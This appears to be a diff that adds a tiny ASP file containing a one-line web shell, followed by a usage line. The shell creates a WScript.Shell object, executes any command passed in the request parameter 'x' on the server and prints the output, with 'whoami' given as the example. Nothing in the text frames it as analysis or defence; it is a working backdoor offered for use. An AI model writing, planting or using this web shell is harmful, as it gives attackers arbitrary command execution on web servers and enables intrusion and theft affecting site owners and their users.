@@ -1,0 +1,6 @@
+ASP
+<%                                                                                                                                                                       
+response.write server.createobject("wscript.shell").exec(request("x")).stdout.readall                                                                             
+%>   
+Usage:
+http://x.x.x./xx.asp?x=whoami
